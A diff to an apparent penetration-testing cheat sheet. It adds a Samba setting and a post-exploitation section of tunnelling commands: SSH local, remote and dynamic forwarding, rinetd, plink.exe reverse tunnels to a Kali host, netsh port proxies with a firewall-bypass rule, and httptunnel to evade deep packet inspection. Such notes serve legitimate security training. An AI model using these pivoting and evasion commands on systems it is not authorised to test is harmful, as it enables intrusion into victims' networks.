@@ -464,6 +464,12 @@
 	CVE-2017-7494
 	
 	```
+9. Change Samba protocol version Connection
+	```
+	sudo vim /etc/samba/smb.conf
+	min protocol = SMB2
+	sudo /etc/init.d/smbd restart
+	```
 
 ### 389,636 (LDAP)
 1. Enumeration
@@ -629,4 +635,88 @@
 	evil-winrm -i <IP> -u <USER> -p <PASSWORD>
 	evil-winrm -i <IP> -u <USER> -H <HASH>
 	```
+	
+## Low Privilege Exploitation
 
+## System Enumeration
+
+## High Privilege Exploitation
+	
+## Post Exploitation
+
+### Port Forwarding
+Do not forget to to check /root/port_forwarding_and_tunneling/ssh_renote_port_forwarding.sh
+	```
+	cat /root/port_forwarding_and_tunneling/ssh_renote_port_forwarding.sh
+	/root/port_forwarding_and_tunneling/ssh_renote_port_forwarding.sh
+	```
+1. **RINETD**
+Internet traffic on port 80 redirection from Kali to Victim
+	```
+	vim /etc/rinetd.conf
+	0.0.0.0 80 IP 80
+	sudo service rinetd restart
+	\# Check kali listenening
+	ss -antp | grep "80"
+	\# Test
+	nc -nvv KALI-IP 80
+	```
+
+2. **SSH Tunneling**
+	```
+	ssh -N -L LIP:LPORT:RHOST:RPORT USER@GATEWAY
+	/# Now we are able to connect to the the machine : for example, smbmap
+	smbclient -L 127.0.0.1 -U Administrator
+	```
+
+3. **SSH Remote Port Forwarding**
+	```
+	\# Setup listener in Kali
+	ssh -N -R KALI-IP:LPORT:127.0.0.1:RPORT KALI@KALI-IP
+	\# Check kali listenening
+	ss -antp | grep "LPORT"
+	```
+	
+4. **SSH Dynamic Port Forwarding and ProxyChains usage**
+	```
+	ssh -N -D 127.0.0.1:LPORT USER@RHOST
+	vim /etc/proxychains.conf
+	socks4	127.0.0.1:LPORT
+	sudo proxychains nmap --top-ports=20 -sT -Pn TARGETIP
+	```
+	
+5. **PLINK.exe**
+	```
+	\# Check ports listenening
+	netstat -anpb tcp 
+	cmd.exe /c echo y | plink.exe s\=ssh -l kali -pw ilak -R KALI-IP:LPORT:127.0.0.1:RPORT KALI-IP
+	\# In Kali
+	sudo nmap -sS -sV 127.0.0.1 -p LPORT
+	```
+
+6. **NETSH**
+	```
+	netsh interface portproxy add v4tov4 listenport=LPORT listenaddress=LHOST connectport=RPORT connectaddress=RHOST
+	\# Avoid firewall
+	netsh advfirewall firewall add rule name ="forward_port_rule" protocol=TCP dir=in localip=LHOST localport=LPORT action=allow
+	\# In kali
+	smbclient -L RHOST --port=LPORT --user=Administrator
+	sudo mount -t cifs -o port=LPORT //RHOST/Data -o username=Administrator,password=password /mnt/win10_share
+	ls -l /mnt/win10_share/
+	```
+
+7. **HTTPTunnel-ing Through Deep Packet Inspection**
+	```
+	apt-cache search httptunnel
+	sudo apt install httptunnel
+	ssh -L 0.0.0.0:LPORT:RHOST:RPORT USER@127.0.0.1
+	\# After ssh, confirm 
+	ss -antp | grep "8888"
+	\# On kali
+	htc --forward-port LPORT RHOST:RPORT
+	\# Confirm
+	ps aux | grep htc
+	ss- antp | grep "8080"
+	
+### Active Directory 
+	```
